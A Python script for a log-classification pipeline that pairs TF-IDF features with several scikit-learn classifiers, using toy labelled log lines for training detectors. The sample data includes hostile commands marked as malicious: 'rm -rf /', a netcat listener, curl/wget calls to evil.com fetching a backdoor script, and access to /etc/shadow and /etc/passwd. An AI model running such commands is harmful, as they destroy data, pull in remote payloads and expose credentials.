# pipeline1_tfidf_classic_ml.py

from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Any

import numpy as np

from sklearn.model_selection import train_test_split, GroupShuffleSplit
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.pipeline import Pipeline

from sklearn.metrics import (
    accuracy_score,
    f1_score,
    precision_recall_fscore_support,
    classification_report,
    confusion_matrix,
)

from sklearn.svm import LinearSVC
from sklearn.linear_model import LogisticRegression, SGDClassifier, PassiveAggressiveClassifier, RidgeClassifier
from sklearn.naive_bayes import MultinomialNB, ComplementNB, BernoulliNB
from sklearn.neighbors import KNeighborsClassifier


# -----------------------------
# 1) Data container
# -----------------------------
@dataclass(frozen=True)
class Example:
    """A single labeled example."""
    text: str
    label: str
    group: Optional[str] = None   # e.g. session_id, host_id; optional


# -----------------------------
# 2) Splitting (single place)
# -----------------------------
@dataclass(frozen=True)
class Split:
    train_idx: np.ndarray
    val_idx: np.ndarray
    test_idx: np.ndarray


def make_splits(
    y: np.ndarray,
    groups: Optional[np.ndarray] = None,
    *,
    test_size: float = 0.2,
    val_size: float = 0.1,
    random_state: int = 42,
    stratify: bool = True,
) -> Split:
    """
    Create train/val/test indices once and reuse everywhere.

    If `groups` is provided: uses GroupShuffleSplit to avoid leakage.
    Note: Group splitting cannot also perfectly stratify; it prioritizes non-leakage.
    """
    n = len(y)
    idx = np.arange(n)

    if groups is None:
        strat = y if stratify else None

        train_val_idx, test_idx = train_test_split(
            idx,
            test_size=test_size,
            random_state=random_state,
            stratify=strat,
        )

        # val is a fraction of the *original* dataset.
        # Convert to fraction of train_val:
        val_frac_of_train_val = val_size / (1.0 - test_size)
        strat_train_val = y[train_val_idx] if stratify else None

        train_idx, val_idx = train_test_split(
            train_val_idx,
            test_size=val_frac_of_train_val,
            random_state=random_state,
            stratify=strat_train_val,
        )
        return Split(train_idx=train_idx, val_idx=val_idx, test_idx=test_idx)

    # Group-aware split (no leakage by group)
    gss1 = GroupShuffleSplit(n_splits=1, test_size=test_size, random_state=random_state)
    train_val_idx, test_idx = next(gss1.split(idx, y, groups=groups))

    # Now split train_val into train/val (still group-aware)
    val_frac_of_train_val = val_size / (1.0 - test_size)
    gss2 = GroupShuffleSplit(n_splits=1, test_size=val_frac_of_train_val, random_state=random_state)
    train_idx, val_idx = next(gss2.split(train_val_idx, y[train_val_idx], groups=groups[train_val_idx]))

    # gss2 returns indices relative to train_val_idx; convert back:
    train_idx = train_val_idx[train_idx]
    val_idx = train_val_idx[val_idx]

    return Split(train_idx=train_idx, val_idx=val_idx, test_idx=test_idx)


# -----------------------------
# 3) Evaluation (single place)
# -----------------------------
@dataclass
class EvalResult:
    accuracy: float
    f1_macro: float
    f1_weighted: float
    per_class_report: str
    confusion: np.ndarray


def evaluate_classifier(
    y_true: np.ndarray,
    y_pred: np.ndarray,
    *,
    labels: Optional[List[str]] = None,
) -> EvalResult:
    acc = accuracy_score(y_true, y_pred)
    f1m = f1_score(y_true, y_pred, average="macro")
    f1w = f1_score(y_true, y_pred, average="weighted")

    report = classification_report(y_true, y_pred, labels=labels, digits=4, zero_division=0)
    cm = confusion_matrix(y_true, y_pred, labels=labels)

    return EvalResult(
        accuracy=acc,
        f1_macro=f1m,
        f1_weighted=f1w,
        per_class_report=report,
        confusion=cm,
    )


# -----------------------------
# 4) Model zoo
# -----------------------------
def get_model_zoo(random_state: int = 42) -> Dict[str, Any]:
    """
    Returns sklearn estimators. Many are strong for TF-IDF.
    Notes:
      - LinearSVC is often a top baseline but doesn't output probabilities.
      - Naive Bayes can be excellent if features are well-formed.
      - KNN on sparse vectors can be slow for large datasets.
    """
    return {
        "svm": LinearSVC(C=1.0),
        "logreg": LogisticRegression(max_iter=2000, n_jobs=None),
        "sgd_hinge": SGDClassifier(loss="hinge", random_state=random_state),
        "sgd_log": SGDClassifier(loss="log_loss", random_state=random_state),
        "pa_like": SGDClassifier(loss="hinge", penalty=None, learning_rate="pa1", eta0=1.0, random_state=random_state),
        "ridge": RidgeClassifier(),
        "mnb": MultinomialNB(alpha=0.1),
        "cnb": ComplementNB(alpha=0.1),
        "bnb": BernoulliNB(alpha=0.1),
        "knn": KNeighborsClassifier(metric="cosine"),
    }


# -----------------------------
# 5) TF-IDF + model runner
# -----------------------------
@dataclass
class VectorizerConfig:
    analyzer: str = "char"            # "char" is often excellent for logs
    ngram_range: Tuple[int, int] = (3, 5)
    min_df: int = 2
    max_df: float = 0.95
    sublinear_tf: bool = True
    lowercase: bool = False           # logs are often case-sensitive
    max_features: Optional[int] = None


def build_tfidf_vectorizer(cfg: VectorizerConfig) -> TfidfVectorizer:
    return TfidfVectorizer(
        analyzer=cfg.analyzer,
        ngram_range=cfg.ngram_range,
        min_df=cfg.min_df,
        max_df=cfg.max_df,
        sublinear_tf=cfg.sublinear_tf,
        lowercase=cfg.lowercase,
        max_features=cfg.max_features,
    )


@dataclass
class RunConfig:
    vectorizer: VectorizerConfig
    models: Optional[List[str]] = None  # None => run all
    random_state: int = 42


def run_tfidf_model_zoo(
    examples: List[Example],
    split: Split,
    cfg: RunConfig,
) -> Dict[str, Dict[str, EvalResult]]:
    """
    Trains each model on train, evaluates on val and test.
    Returns nested dict: results[model_name]["val"|"test"] = EvalResult
    """
    X = np.array([ex.text for ex in examples], dtype=object)
    y = np.array([ex.label for ex in examples], dtype=object)

    vec = build_tfidf_vectorizer(cfg.vectorizer)
    zoo = get_model_zoo(random_state=cfg.random_state)

    model_names = cfg.models if cfg.models is not None else list(zoo.keys())

    results: Dict[str, Dict[str, EvalResult]] = {}

    X_train, y_train = X[split.train_idx], y[split.train_idx]
    X_val, y_val = X[split.val_idx], y[split.val_idx]
    X_test, y_test = X[split.test_idx], y[split.test_idx]

    all_labels_sorted = sorted(list(set(y.tolist())))

    for name in model_names:
        if name not in zoo:
            raise ValueError(f"Unknown model '{name}'. Available: {list(zoo.keys())}")

        model = zoo[name]
        clf = Pipeline([
            ("tfidf", vec),
            ("clf", model),
        ])

        clf.fit(X_train, y_train)

        y_val_pred = clf.predict(X_val)
        y_test_pred = clf.predict(X_test)

        results[name] = {
            "val": evaluate_classifier(y_val, y_val_pred, labels=all_labels_sorted),
            "test": evaluate_classifier(y_test, y_test_pred, labels=all_labels_sorted),
        }

    return results


# -----------------------------
# 6) Convenience: pretty print leaderboard
# -----------------------------
def print_leaderboard(results: Dict[str, Dict[str, EvalResult]], split_name: str = "val") -> None:
    rows = []
    for model_name, res in results.items():
        r = res[split_name]
        rows.append((model_name, r.f1_macro, r.f1_weighted, r.accuracy))
    rows.sort(key=lambda x: x[1], reverse=True)  # sort by macro F1

    print(f"\nLeaderboard ({split_name}) — sorted by F1-macro")
    print("model\t\tf1_macro\tf1_weighted\taccuracy")
    for m, f1m, f1w, acc in rows:
        print(f"{m:10s}\t{f1m:.4f}\t\t{f1w:.4f}\t\t{acc:.4f}")


# -----------------------------
# 7) Example usage (replace with your data loader)
# -----------------------------
if __name__ == "__main__":
    # Dummy toy data — replace with real log lines
    examples = [
        # --- sess1 (alice mostly benign with one suspicious) ---
        Example("USER=alice ACTION=login STATUS=ok IP=10.0.0.1", "benign", group="sess1"),
        Example("USER=alice ACTION=view FILE=/home/alice/report.pdf STATUS=ok", "benign", group="sess1"),
        Example("USER=alice ACTION=download FILE=/etc/shadow STATUS=denied", "suspicious", group="sess1"),
        Example("USER=alice ACTION=logout STATUS=ok", "benign", group="sess1"),

        # --- sess2 (bob mixed benign + suspicious) ---
        Example("USER=bob ACTION=login STATUS=fail IP=10.0.0.2", "benign", group="sess2"),
        Example("USER=bob ACTION=login STATUS=ok IP=10.0.0.2", "benign", group="sess2"),
        Example("USER=bob ACTION=sudo STATUS=ok", "suspicious", group="sess2"),
        Example("USER=bob ACTION=download FILE=/var/log/syslog STATUS=ok", "benign", group="sess2"),
        Example("USER=bob ACTION=upload FILE=/tmp/script.sh STATUS=ok", "suspicious", group="sess2"),

        # --- sess3 (mallory clearly malicious pattern) ---
        Example("USER=mallory ACTION=exec CMD='rm -rf /' STATUS=blocked", "malicious", group="sess3"),
        Example("USER=mallory ACTION=exec CMD='curl http://evil.com' STATUS=blocked", "malicious", group="sess3"),
        Example("USER=mallory ACTION=exec CMD='nc -lvp 4444' STATUS=blocked", "malicious", group="sess3"),
        Example("USER=mallory ACTION=login STATUS=fail IP=192.168.1.50", "malicious", group="sess3"),

        # --- sess4 (charlie mostly benign office behavior) ---
        Example("USER=charlie ACTION=login STATUS=ok IP=10.0.0.5", "benign", group="sess4"),
        Example("USER=charlie ACTION=view FILE=/shared/budget.xlsx STATUS=ok", "benign", group="sess4"),
        Example("USER=charlie ACTION=edit FILE=/shared/budget.xlsx STATUS=ok", "benign", group="sess4"),
        Example("USER=charlie ACTION=logout STATUS=ok", "benign", group="sess4"),

        # --- sess5 (eve reconnaissance style suspicious) ---
        Example("USER=eve ACTION=login STATUS=ok IP=172.16.0.9", "suspicious", group="sess5"),
        Example("USER=eve ACTION=list FILE=/etc STATUS=ok", "suspicious", group="sess5"),
        Example("USER=eve ACTION=download FILE=/etc/passwd STATUS=ok", "suspicious", group="sess5"),
        Example("USER=eve ACTION=exec CMD='whoami' STATUS=ok", "suspicious", group="sess5"),

        # --- sess6 (admin normal maintenance) ---
        Example("USER=root ACTION=login STATUS=ok IP=127.0.0.1", "benign", group="sess6"),
        Example("USER=root ACTION=update PACKAGE=openssl STATUS=ok", "benign", group="sess6"),
        Example("USER=root ACTION=restart SERVICE=apache2 STATUS=ok", "benign", group="sess6"),
        Example("USER=root ACTION=logout STATUS=ok", "benign", group="sess6"),

        # --- sess7 (attacker escalation attempt) ---
        Example("USER=mallory ACTION=sudo STATUS=fail", "malicious", group="sess7"),
        Example("USER=mallory ACTION=exec CMD='chmod 777 /etc/shadow' STATUS=blocked", "malicious", group="sess7"),
        Example("USER=mallory ACTION=exec CMD='wget http://evil.com/backdoor.sh' STATUS=blocked", "malicious", group="sess7"),

        # --- sess8 (normal user mild anomaly) ---
        Example("USER=david ACTION=login STATUS=ok IP=10.0.0.8", "benign", group="sess8"),
        Example("USER=david ACTION=exec CMD='python script.py' STATUS=ok", "suspicious", group="sess8"),
        Example("USER=david ACTION=upload FILE=/var/www/html/test.php STATUS=ok", "suspicious", group="sess8"),
        Example("USER=david ACTION=logout STATUS=ok", "benign", group="sess8"),
    ]


    y = np.array([e.label for e in examples])
    groups = np.array([e.group for e in examples], dtype=object)

    split = make_splits(y, groups=groups, test_size=0.2, val_size=0.2, random_state=42)

    cfg = RunConfig(
        vectorizer=VectorizerConfig(analyzer="char", ngram_range=(3, 5), min_df=1),
        models=None,  # run all
        random_state=42,
    )

    results = run_tfidf_model_zoo(examples, split, cfg)
    print_leaderboard(results, "val")
    print_leaderboard(results, "test")

    # Print detailed report for the best model on val (example)
    # (You can choose programmatically; here we just show one.)
    model_name = "svm"
    print(f"\n=== {model_name} VAL report ===\n{results[model_name]['val'].per_class_report}")
    print(f"Confusion matrix (val):\n{results[model_name]['val'].confusion}")
